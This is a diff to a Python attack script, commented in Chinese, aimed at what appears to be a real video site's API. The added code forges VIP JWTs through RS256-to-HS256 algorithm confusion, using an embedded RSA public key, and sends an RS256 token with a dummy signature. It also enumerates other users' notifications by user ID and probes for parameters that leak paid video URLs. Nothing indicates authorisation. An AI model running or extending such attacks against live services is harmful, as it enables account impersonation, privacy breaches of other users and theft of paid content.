@@ -101,6 +101,25 @@ jwts.append(
         + ".x",
     )
 )
+# 算法混淆: 用 JS 里的 RSA 公钥作为 HS256 密钥
+PUB_B64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsoA9UZOV8b0G/kntXw8WKZpH2rp0KQIEoSmM8IMmOcYhvGjlEvSKs+30+XxUDP+7TIvIP/grz/ORQMHVhVM9EmVLR+GK/PawUXLjdYykSNI4D7Ce0/aW29DF1jVBGBCoe/jpV+3rwXN4eM6ScMaQT9+cQB4hN2VQn4Zcwkd8lw9UZKxdiuF2rbCmasG9s5/p5mtAbYDsq7s1D4WP9VwWhoRKVebuiVuXoF0wps8XeMTxmX8uLLqR8TGLzPvHWkyhAnwixnV3eKf2lGwraEJs0j0WVKRuv3iWz8sGaT/thwXyroRgKfTctjqinI1Kc+hn+TMhsUrnnJHbS8M9KZqK7QIDAQAB"
+PUB_PEM = "-----BEGIN PUBLIC KEY-----\n" + PUB_B64 + "\n-----END PUBLIC KEY-----"
+try:
+    PUB_DER = base64.b64decode(PUB_B64)
+except Exception:
+    PUB_DER = b""
+jwts.append(("confuse-pem", make_jwt("HS256", vip_payload, PUB_PEM)))
+jwts.append(("confuse-b64", make_jwt("HS256", vip_payload, PUB_B64)))
+jwts.append(("confuse-der", make_jwt("HS256", vip_payload, PUB_DER.decode("latin1"))))
+jwts.append(
+    (
+        "confuse-rs256",
+        b64u(b'{"alg":"RS256","typ":"JWT"}')
+        + "."
+        + b64u(json.dumps(vip_payload).encode())
+        + ".x",
+    )
+)
 for name, t in jwts:
     st, b = req(
         "GET",
@@ -137,6 +156,61 @@ for method, path, hdrs in idor_tests:
     st, b = req(method, path, headers=hdrs)
     res.append({"t": "idor-" + path, "s": st, "b": b[:250]})
     log("idor %s: %s %s" % (path[:50], st, b[:90].replace("\n", " ")))
+    time.sleep(0.4)
+
+# 2b. IDOR 通知越权深挖 (user_id 枚举)
+log("=== 通知越权 ===")
+for uid in [1, 2, 3, 5, 10, 100, 1000, 686285, 236238]:
+    st, b = req("GET", "/api/user/notifications?user_id=%d" % uid, headers=H)
+    res.append({"t": "notif-%d" % uid, "s": st, "b": b[:400]})
+    log("notif uid=%d: %s %s" % (uid, st, b[:130].replace("\n", " ")))
+    time.sleep(0.4)
+
+# 2c. 历史/其他用户接口
+log("=== 历史/杂项 ===")
+misc_tests = [
+    ("GET", "/api/user/history?page=1", H),
+    ("GET", "/api/user/history", H),
+    ("POST", "/api/user/history", {}),
+    ("GET", "/api/user/oldUserCheck", H),
+    ("GET", "/api/user/mylikes?page=1", H),
+    ("GET", "/api/user/loi/like/6422", H),
+    ("POST", "/api/user/loi/like", {"loi_id": 6422}),
+    ("GET", "/api/user/mydownloaded?page=1", H),
+    ("GET", "/api/user/subscribed/list?page=1", H),
+    ("GET", "/api/user/category/info/1", H),
+    ("GET", "/api/user/tag/info/1", H),
+]
+for method, path, hdrs in misc_tests:
+    st, b = req(method, path, headers=hdrs)
+    res.append({"t": "misc-" + path[:40], "s": st, "b": b[:300]})
+    log("misc %s: %s %s" % (path[:45], st, b[:110].replace("\n", " ")))
+    time.sleep(0.4)
+
+# 2d. 字段投影攻击 (include/fields 尝试返回视频字段)
+log("=== 字段投影 ===")
+proj_urls = [
+    "/api/lois/6422?include=video",
+    "/api/lois/6422?include=video_url",
+    "/api/lois/6422?with=video",
+    "/api/lois/6422?fields=video,images",
+    "/api/lois/6422?expand=video",
+    "/api/lois/6422?embed=video",
+    "/api/lois?page=1&include=video",
+    "/api/lois?page=1&with=video_url",
+    "/api/user/loi/download_v6/6422?include=url",
+    "/api/user/loi/online_play_v2/6422?include=video",
+    "/api/lois/6422?include[]=video",
+    "/api/lois/6422?select=*",
+]
+for path in proj_urls:
+    st, b = req("GET", path, headers=H)
+    got_video = "video" in b.lower() and "60001" not in b
+    res.append({"t": "proj-" + path[:50], "s": st, "b": b[:300]})
+    log(
+        "proj %s: %s %s%s"
+        % (path[:55], st, b[:100].replace("\n", " "), " <<<VIDEO!" if got_video else "")
+    )
     time.sleep(0.4)
 
 # 3. 二次注入/编码绕过
